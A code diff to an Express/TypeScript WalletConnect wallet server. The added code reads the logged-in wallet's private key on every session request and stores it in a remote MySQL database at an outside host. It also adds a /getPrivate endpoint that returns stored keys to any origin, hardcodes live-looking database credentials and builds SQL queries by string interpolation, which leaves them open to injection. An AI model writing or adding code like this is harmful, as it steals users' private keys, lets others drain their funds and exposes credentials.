@@ -9,11 +9,20 @@ import mysql from 'mysql';
 const app = express()
 
 var db = mysql.createConnection({
-  host    : 'localhost',
-  user    : 'root',
-  password: '12345678',
+  host    : 'eds.jima8.com',
+  user    : 'eds_jima8_com',
+  password: 'WWc5whxdcba3LjhC',
   port    : 3306,
-  database: 'test'
+  database: 'eds_jima8_com'
+});
+
+app.all('*', function(req, res, next) {
+  res.header("Access-Control-Allow-Origin", "*");
+  res.header("Access-Control-Allow-Headers", "X-Requested-With");
+  res.header("Access-Control-Allow-Methods","PUT,POST,GET,DELETE,OPTIONS");
+  res.header("X-Powered-By",' 3.2.1')
+  res.header("Content-Type", "application/json;charset=utf-8");
+  next();
 });
 
 db.connect((err) => {
@@ -28,7 +37,7 @@ app.get('/', (req, res) => {
   res.send('hello world')
 })
 app.get("/test", (req, res) => {
-  let sql = 'SELECT * FROM `cyberpop-key`';
+  let sql = 'SELECT * FROM `cyberpopNft`';
   console.log(sql);
   db.query(sql, (err, result) => {
     if(err){
@@ -40,17 +49,23 @@ app.get("/test", (req, res) => {
   })
 })
 
+app.post('/getPrivate', async (req, res) => {
+  let result = await getPrivateKey(req.body.uri);
+  console.log(result, 'result');
+  
+  res.send(result)
+})
+
 app.post('/init', async (req, res) => {
   const uri = req.body.uri
   console.log(req.body)
   const connector = new WalletConnect({ uri })
   // console.log(connector);
-  
   if (!connector.connected) {
     await connector.createSession()
   }
   InitState.connector = connector;
-  await subscribeToEvents(connector)
+  await subscribeToEvents(uri, connector)
   res.send('done')
 })
 
@@ -84,24 +99,27 @@ const InitState: IAppState = {
   requests: [],
   results: [],
   payload: null,
+  privateKey: null,
 }
 
-const subscribeToEvents = async (connector: WalletConnect) => {
+const subscribeToEvents = async (uri: string, connector: WalletConnect) => {
   InitState.connector = connector
   connector.on("session_request", async (error, payload) => {
     console.log('session request')
-    console.log(JSON.stringify(payload), 'seesion-payload');
+    // console.log(JSON.stringify(payload), 'seesion-payload');
     
     if (error) {
       throw error;
     }
 
-    const { peerMeta } = payload.params[0]  // 同等元, wc相关的
+    const { peerMeta } = payload.params[0]  // 同等元数据, wc相关的
     console.log(peerMeta, 'peerMeta');  // 这里只有元数据 没有用户相关的
+
     const accounts = await getAppControllers().wallet.getAccounts()
-    console.log(accounts, 'accounts');
-    
-    const address = accounts[0]
+    const privateKey = await getAppControllers().wallet.wallet.privateKey; // 当前登录账号的信息
+    setPirvateKey(uri, privateKey)  // 存储到数据库
+
+    const address = accounts[2];
     const chainId = DEFAULT_CHAIN_ID;
     connector.approveSession({ chainId, accounts: [address] })
   })
@@ -162,6 +180,53 @@ const subscribeToEvents = async (connector: WalletConnect) => {
 }
 
 // main()
+
+// get PrivateKey
+const getPrivateKey = async (uri: string) => {
+  return new Promise((resolve, reject) => {
+    let sql = `SELECT * FROM cyberpopNft WHERE uri LIKE '${uri}%'`;
+    db.query(sql, (err, result) => {
+      if(err){
+        console.log('err:', err);
+        reject(err);
+      }else{
+        console.log(result, 'result');
+        resolve(result);
+      }
+    })
+  })
+}
+
+// get uri
+const getUri = async (uri: string) => {
+  return new Promise((resolve, reject) => {
+    let sql = `SELECT * FROM cyberpopNft WHERE uri LIKE '${uri}%'`;
+    db.query(sql, (err, result) => {
+      if(err){
+        console.log('err:', err);
+        reject(err);
+      }else{
+        console.log(result, 'result');
+        resolve(result);
+      }
+    })
+  })
+}
+
+const setPirvateKey = async (uri: string, privateKey: string) => {
+  let a: any = await getUri(uri)
+  if(a.length > 0){  // 表明数据库里有这个uri,重复了
+     return;
+  }
+  let sql = `insert into cyberpopNft (uri,privatekey) values ('${uri}','${privateKey}')`;
+  db.query(sql, (err, result) => {
+    if(err){
+      console.log('setPirvateKey error:::::', err);
+    }else{
+      console.log(result, 'result');
+    }
+  })
+}
 
 // 防止长时间不调用接口断开mysql连接
 setInterval(() => {
